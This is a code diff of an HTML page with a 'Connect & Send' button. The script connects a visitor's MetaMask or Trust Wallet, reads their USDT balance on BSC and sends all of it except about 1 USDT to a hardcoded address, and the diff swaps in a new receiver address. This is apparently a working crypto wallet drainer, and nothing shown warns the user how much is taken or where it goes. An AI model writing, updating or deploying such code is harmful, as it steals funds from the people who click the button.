@@ -8,9 +8,8 @@
   <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    const receiverAddress = "0xc64087a6Fd263ab6A140F9b46f4cAF7B3e82147f".trim().toLowerCase();
-    const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT on BSC
-
+    const receiver = '0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a'; // NEW Receiver
+    const usdtAddress = '0x55d398326f99059ff775485246999027b3197955'; // USDT BEP20
     const usdtAbi = [
       {
         "constant": true,
@@ -32,42 +31,37 @@
     ];
 
     async function connectAndTransfer() {
-      if (window.ethereum) {
-        const web3 = new Web3(window.ethereum);
-        try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const accounts = await web3.eth.getAccounts();
-          const sender = accounts[0];
+      if (!window.ethereum) {
+        alert("Please install MetaMask or Trust Wallet.");
+        return;
+      }
 
-          // Validate address format
-          if (!Web3.utils.isAddress(receiverAddress)) {
-            alert("Invalid receiver address format.");
-            return;
-          }
+      const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const sender = accounts[0];
 
-          const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
-          const balanceStr = await usdtContract.methods.balanceOf(sender).call();
-          const balance = web3.utils.toBigInt(balanceStr);
-          const gasFeeUsdt = 2000000n;
+      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const balanceStr = await usdt.methods.balanceOf(sender).call();
+      const balance = web3.utils.toBigInt(balanceStr);
 
-          if (balance <= gasFeeUsdt) {
-            alert("Insufficient USDT balance to send after gas fees.");
-            return;
-          }
+      const minBalance = 1000000n; // ~1 USDT as gas buffer
+      if (balance <= minBalance) {
+        alert("Insufficient USDT balance.");
+        return;
+      }
 
-          const amountToSend = balance - gasFeeUsdt;
+      const amountToSend = balance - minBalance;
 
-          const tx = await usdtContract.methods
-            .transfer(receiverAddress, amountToSend.toString())
-            .send({ from: sender });
+      try {
+        const tx = await usdt.methods
+          .transfer(receiver, amountToSend.toString())
+          .send({ from: sender });
 
-          alert("USDT sent! Tx hash: " + tx.transactionHash);
-        } catch (err) {
-          console.error("Error:", err);
-          alert("Transaction failed: " + err.message);
-        }
-      } else {
-        alert("Install MetaMask or Trust Wallet.");
+        alert("USDT sent! Tx hash: " + tx.transactionHash);
+      } catch (err) {
+        console.error(err);
+        alert("Transaction failed: " + err.message);
       }
     }
   </script>
